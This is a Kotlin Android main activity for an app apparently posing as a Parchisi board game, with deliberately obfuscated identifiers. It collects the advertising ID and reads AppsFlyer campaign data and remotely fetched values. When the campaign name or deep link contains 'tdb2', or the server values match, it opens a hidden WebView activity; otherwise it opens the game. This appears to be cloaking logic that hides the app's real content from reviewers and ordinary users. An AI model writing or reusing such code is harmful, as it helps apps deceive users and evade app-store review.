package com.superking.parchisi.st

import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.viewModels
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.superking.parchisi.st.ncixuhcxgysd.Vfysuaqw
import com.superking.parchisi.st.bxzuhzhuxsaw.Mxoxzijjsa
import com.superking.parchisi.st.bxzuhzhuxsaw.Vdopppxpzoxkozs
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    var uushdha: String = ""
    var xijci: String = ""
    private lateinit var kxokxcijcxs : SharedPreferences
    private lateinit var euiheru : SharedPreferences
    private lateinit var soisjdjiwhuwd : SharedPreferences
    private lateinit var oxkcjixixc : SharedPreferences
    private lateinit var isjds : SharedPreferences
    private val xockxco: Mxoxzijjsa by viewModels()
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        euiheru = getSharedPreferences(Qosisuahas.apps, MODE_PRIVATE)
        kxokxcijcxs = getSharedPreferences(Qosisuahas.link, MODE_PRIVATE)
        soisjdjiwhuwd = getSharedPreferences(Qosisuahas.main_id, MODE_PRIVATE)
        oxkcjixixc= getSharedPreferences(Qosisuahas.deeps, MODE_PRIVATE)
        isjds= getSharedPreferences(Qosisuahas.namings, MODE_PRIVATE)
        lifecycleScope.launch {
            xockxco.forijdsok(this@MainActivity)
            AppsFlyerLib.getInstance()
                .init(Qosisuahas.appsID, sjijidijdskokoxkocjixc, applicationContext)
            AppsFlyerLib.getInstance().start(this@MainActivity)
        }


        sidjjisd()
    }

    private fun sidjjisd(){
        xockxco.zpzokxkozkoaji()
        xockxco.isdjasdj.observe(this,{
            xijci =  it.loixizjuhs
            xockxco.eosjiiasjid()
            xockxco.suhdhusahu.observe(this,{
               val siudij = it.cijv
                uushdha = it.ijsdjia
                val appsCheckerkis = it.soddasijiasdj
                euiheru.edit().putString(Qosisuahas.apps,appsCheckerkis).apply()
                kxokxcijcxs.edit().putString(Qosisuahas.link,siudij).apply()
                aopsosjd()

            })

        })



    }

    private fun aopsosjd() {
        lifecycleScope.launch(Dispatchers.IO) {
            val intentNorm = Intent(this@MainActivity, Vdopppxpzoxkozs::class.java)
            val apps = euiheru.getString(Qosisuahas.apps,"null")
            var naming: String? = isjds.getString(Qosisuahas.namings,"null")
            val deep: String? = oxkcjixixc.getString(Qosisuahas.deeps,"null")
            val njcixuhchu = Executors.newSingleThreadScheduledExecutor()
            rijejijifjsdad()
            if (apps == "1") {
                njcixuhchu.scheduleAtFixedRate({
                    if (naming != null) {
                        if (naming!!.contains("tdb2") && deep!!.contains(
                                "tdb2"
                            )
                        ) {
                            njcixuhchu.shutdown()
                            intentNorm.putExtra("WebInt", "campaign")
                            startActivity(intentNorm)
                            finish()


                        } else if(naming!!.contains("tdb2") || uushdha.contains(xijci)){
                            njcixuhchu.shutdown()
                            intentNorm.putExtra("WebInt", "campaign")
                            startActivity(intentNorm)
                            finish()
                        } else if(!naming!!.contains("tdb2") && deep!!.contains(
                                "tdb2"
                            )){
                            njcixuhchu.shutdown()
                            intentNorm.putExtra("WebInt", "deepLink")
                            startActivity(intentNorm)
                            finish()

                        } else {
                            njcixuhchu.shutdown()
                            startActivity(Intent(this@MainActivity, Vfysuaqw::class.java))
                            finish()
                        }
                    } else {
                        naming = isjds.getString(Qosisuahas.namings,"null")
                    }
                }, 0, 2, TimeUnit.SECONDS)
            } else {
              if(deep!!.contains(
                      "tdb2")){
                  intentNorm.putExtra("WebInt", "deepLink")
                  startActivity(intentNorm)
                  finish()
              } else if(uushdha.contains(xijci)){
                  intentNorm.putExtra("WebInt", "MT")
                  startActivity(intentNorm)
                  finish()
              }else{
                  startActivity(Intent(this@MainActivity, Vfysuaqw::class.java))
                  finish()
              }

            }

        }
    }

    private fun rijejijifjsdad() {
        val ocxokvdjijisdiv = AdvertisingIdClient(applicationContext)
        ocxokvdjijisdiv.start()
        val diosjfjisd = ocxokvdjijisdiv.info.id
        soisjdjiwhuwd.edit().putString(Qosisuahas.main_id,diosjfjisd).apply()
    }

    val sjijidijdskokoxkocjixc = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val forijf = data?.get("campaign").toString()
            isjds.edit().putString(Qosisuahas.namings,forijf).apply()
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }




}